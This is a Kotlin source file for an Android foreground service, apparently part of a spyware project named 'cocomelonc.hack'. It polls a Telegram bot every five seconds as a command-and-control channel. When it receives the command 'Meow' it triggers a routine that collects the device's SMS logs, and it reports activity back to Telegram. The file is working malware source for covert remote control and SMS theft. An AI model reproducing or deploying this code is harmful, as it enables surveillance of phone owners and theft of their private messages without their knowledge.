package cocomelonc.hack.services

import android.app.*
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

import android.util.Log
import cocomelonc.hack.tools.HackNetwork
import cocomelonc.hack.tools.HackSmsLogs
import kotlinx.coroutines.CoroutineScope

class TelegramService() : Service() {

    private val notificationChannelId = "telegram_listener_channel"
    private var lastUpdateId = 0

    override fun onCreate() {
        super.onCreate()
        Log.d("TelegramService", "service started")

        val context = applicationContext
        val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager

        createNotificationChannel()
        startForeground(1, createNotification())
        CoroutineScope(Dispatchers.IO).launch {
            startListeningForMessages()
        }
    }

    private fun startListeningForMessages() {
        // get updates from Telegram
        try {
            while (true) {
                val updatesResponse = HackNetwork(applicationContext).getUpdates(lastUpdateId) // new messages
                val updates = updatesResponse?.updates()

                if (updates != null) {
                    for (update in updates) {
                        // message test
                        val message = update.message().text()
                        sendMessageToTelegram("New message received: $message")
                        Log.d("TelegramService", "New message received: $message")
                        processCommand(message)
                        lastUpdateId = update.updateId() + 1
                    }
                }
                // sleep
                Thread.sleep(5000)  // every 5 sec
            }
        } catch (e: Exception) {
            Log.d("TelegramService", "{$e.message}")
        }
    }

    private fun sendMessageToTelegram(message: String) {
        HackNetwork(applicationContext).sendTextMessage(message)
    }

    private fun processCommand(command: String) {
        // fetch commands
        if (command.contains("Meow")) {
            HackSmsLogs(applicationContext).getSmsLogs()
            Log.d("TelegramService", "{$command}")
        } else {
            Log.d("TelegramService", "Unknown command: {$command}")
        }
    }

    private fun createNotification(): Notification {
        return NotificationCompat.Builder(this, notificationChannelId)
            .setContentTitle("Hack Listener")
            .setContentText("Listening for new messages")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .build()
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                notificationChannelId,
                "Telegram Listener Service",
                NotificationManager.IMPORTANCE_LOW
            )
            val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            notificationManager.createNotificationChannel(channel)
        }
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    override fun onDestroy() {
        super.onDestroy()
        // stop listener
        Log.d("TelegramService", "Service stopped")
    }
}